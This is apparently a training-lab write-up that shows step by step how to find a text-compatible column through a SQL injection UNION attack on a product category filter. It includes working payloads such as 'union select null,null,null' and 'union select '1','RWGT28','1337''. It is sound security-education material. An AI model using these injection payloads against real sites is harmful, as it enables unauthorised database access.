# Lab: SQL injection UNION attack, finding a column containing text

## Description

*This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.*

*The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.*

## Step 1 verify sqli

Adding a single quote 

![image](https://user-images.githubusercontent.com/83407557/169662917-0f1a3e1c-6618-4c84-bb4d-86afb67b0d6c.png)

*I also take note of the string I need to get the database to return: RWGT28*

With a single quote to break out of the sql query and then a comment to attempt and get a non-errored response from the server:

![image](https://user-images.githubusercontent.com/83407557/169663003-d6928c6f-839d-4c1d-8070-b5182f3d81f7.png)

## Step 2 Determine the number of columns (using union select null(s))

```sql
union select null
```

![image](https://user-images.githubusercontent.com/83407557/169663087-d4030d5c-f21e-4b11-a39f-be4622f02a36.png)

```sql
union select null,null
```

![image](https://user-images.githubusercontent.com/83407557/169663106-a6b37841-a5f1-45d2-a481-d58a7a84a52a.png)

```sql
union select null,null,null
```

![image](https://user-images.githubusercontent.com/83407557/169663124-e05edda7-4e95-4934-930a-c9b9d606afe8.png)


This shows me there are three columns being returned by the query.

## Step 3 Find out which columns are displaying on screen


```sql
union select '1','2','3'
```

![image](https://user-images.githubusercontent.com/83407557/169663290-3bbd61f9-e208-426b-9a30-f8218e15df72.png)

I can see both the 2 and the 3 returned in the first row, this lets me know that either of those are my entry points. Taking a look at what is being displayed 2 seems like the most likely location to return the string I need to solve the lab, as 3 is a price and may not support the capital letters I need it to.

## Step 4 getting the string RWGT28 to return from the database:

*note since I can also change the price catagory in the return query, why not make it 1337. If I try and place letters in the 3rd column I get a server error.*

```sql
union select '1','RWGT28','1337'
```
![image](https://user-images.githubusercontent.com/83407557/169663463-d2fe7c13-928d-4043-9c4a-66b435626c1a.png)
